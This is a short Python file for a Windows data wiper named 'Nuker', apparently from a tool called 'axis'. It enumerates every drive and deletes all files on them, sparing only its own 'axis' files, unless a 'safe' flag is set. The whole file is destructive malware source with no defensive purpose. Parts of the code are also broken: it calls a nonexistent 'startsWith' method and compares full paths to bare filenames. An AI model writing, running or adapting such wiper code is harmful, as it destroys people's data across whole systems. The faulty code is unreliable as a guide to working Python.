import win32api
import pathlib
import base64
import uuid
import os

USER_NAME = str(pathlib.Path.home())

class Nuker:
    def __init__(self, verbose=False, safe=False):
        self.verbose = verbose
        self.safe = safe

    def log(self, string):
        if self.verbose:
            print(string)

    def _list_drives(self):
        return win32api.GetLogicalDriveStrings().split('\000')[:-1]

    def delete_all_files(self):
        drives = self._list_drives()

        for drive in drives:
            self.log(f'Cached drive {drive}')

            files = []

            for root, dirs, items in os.walk(drive):
                for file in items:
                    self.log(f'Cached file {os.path.join(root, file)}')
                    files.append(os.path.join(root, file))
            
            for file in files:
                if file.startsWith('axis') or file == 'axis.exe':
                    continue

                self.log(f'[{drive}) Deleting file {file}')
                if not self.safe:
                    os.remove(file)

    def start(self):
        self.delete_all_files()